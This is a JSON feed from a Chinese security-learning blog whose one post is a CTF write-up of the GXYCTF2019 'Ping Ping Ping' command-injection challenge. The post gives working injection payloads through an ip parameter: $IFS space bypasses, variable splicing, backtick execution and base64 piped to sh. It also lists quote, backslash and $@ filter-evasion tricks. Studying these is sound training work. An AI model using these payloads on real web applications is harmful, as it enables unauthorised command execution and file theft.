{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie • All posts by \"命令执行\" tag",
    "description": "学习博客",
    "home_page_url": "http://imfanqie.top",
    "items": [
        {
            "id": "http://imfanqie.top/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://imfanqie.top/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "(ctfwp)网站中linux命令执行",
            "date_published": "2021-07-27T13:45:24.931Z",
            "content_html": "<p>这类的题不算多，在这里稍微总结一下</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"gxyctf2019ping-ping-ping\"><a class=\"anchor\" href=\"#gxyctf2019ping-ping-ping\">#</a> [GXYCTF2019]Ping Ping Ping</h1>\n<p>第一次做这种题，有思路但缺少经验，所以没做出来，下面是 wp。</p>\n<p>进去界面什么都没有，只有  /?ip=</p>\n<p>查看源码无果，抓包无果，尝试输入 /?ip=1</p>\n<p>有结果 根据提示：ping</p>\n<p>考虑是 linux 命令，尝试查看目录  /?ip=1;ls</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/wk9qAWMTK8dtsyU.png\" alt=\"1.1.png\">&lt;!--p1--&gt;</p>\n<p>根据结果 cat flag.php，结果不让看，提示猜测应该是过滤了空格</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/bm2O53pIYcLjNzw.png\" alt=\"1.2.png\">&lt;!--p2--&gt;</p>\n<p>经过百度后，发现有以下几种绕过过滤空格的方式：</p>\n<blockquote>\n<ol>\n<li>${IFS} 替换</li>\n<li>$IFS$1 替换</li>\n<li>${IFS 替换</li>\n<li>%20 替换</li>\n<li>&lt;和 &lt;&gt; 重定向符替换</li>\n<li>%09 替换</li>\n</ol>\n</blockquote>\n<p>尝试第一种不行，<strong>(这里我提前做了下 FUZZ 测试，就不放图了，因为我看大佬都没用)</strong> 发现 {} 等等都被过滤了</p>\n<p>于是用第二种</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/gxF3pWdyJhYZwlc.png\" alt=\"1.3.png\">&lt;!--p3--&gt;</p>\n<p>发现 flag 被过滤了，查阅资料后，发现两张方式最合适。</p>\n<p><strong>第一种最常规：</strong>  命令执行拼接</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>a<span class=\"token operator\">=</span>g<span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1fla</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span>php</pre></td></tr></table></figure><p>原理就是 linux 命令的拼接，让 a=g，然后将 flag 换为 fla$a</p>\n<p><strong>第二种最牛逼：</strong>  内联绕过</p>\n<p>内联，就是将反引号内命令的输出作为输入执行。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1</span><span class=\"token string backtick-quoted-string\">`ls`</span></pre></td></tr></table></figure><p>ls 输出的内容直接被执行了</p>\n<p>flag 如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/OYtxEreBvki36Vm.png\" alt=\"1.4.png\">&lt;!--p4--&gt;</p>\n<hr>\n<p>另外我还学到了一些其他的方法，可能本题不适用，但也很常见。</p>\n<p><strong>单引号、双引号绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca\"t fl<span class=\"token string\">''</span>ag</pre></td></tr></table></figure><p><strong>反斜线绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca<span class=\"token punctuation\">\\</span>t fl<span class=\"token punctuation\">\\</span>ag</pre></td></tr></table></figure><p><strong>$1、$2 等和 $@绕过</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token variable\">$1at</span> gh<span class=\"token variable\">$@</span>twf01.txt</pre></td></tr></table></figure><p>如果<strong> cat 被过滤</strong>，可以用下边的方法进行绕过～～</p>\n<pre><code>(1)more:一页一页的显示档案内容\n\n(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页\n\n(3)head:查看头几行\n\n(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\n\n(5)tail:查看尾几行\n\n(6)nl：显示的时候，顺便输出行号\n\n(7)od:以二进制的方式读取档案内容\n\n(8)vi:一种编辑器，这个也可以查看\n\n(9)vim:一种编辑器，这个也可以查看\n\n(10)sort:可以查看\n\n(11)uniq:可以查看\n\n(12)file -f:报错出具体内容\n</code></pre>\n<hr>\n<p>本题还可以用</p>\n<p><strong>sh，bash 下编码</strong></p>\n<p>payload：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo$IFS$1Y2F0IGZsYWcucGhw<span class=\"token operator\">|</span>base64$IFS$<span class=\"token number\">1</span><span class=\"token operator\">-</span>d<span class=\"token operator\">|</span>sh</pre></td></tr></table></figure><p>Y2F0IGZsYWcucGhw 是 cat flag.php 的 base64 编码</p>\n<pre><code class=\"language-sh\">echo&quot;str&quot; | base64 -d\n将base64编码的字符串str+换行 解码输出\n</code></pre>\n<p>|sh 是以 sh 运行，不是 bash。</p>\n<p>具体参考下面这篇文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2VzbW8xOTg5L2FydGljbGUvZGV0YWlscy81MTA5MzQ4OQ==\">Linux base64 -- 用 base64 编解码</span></p>\n<hr>\n<p>另外，常见的管道符还有 <code>||</code>    <code> ;</code>   如果做不出来可以尝试下其他的。</p>\n<hr>\n<p>有新题我会补两道</p>\n<p>END</p>\n",
            "tags": [
                "命令执行"
            ]
        }
    ]
}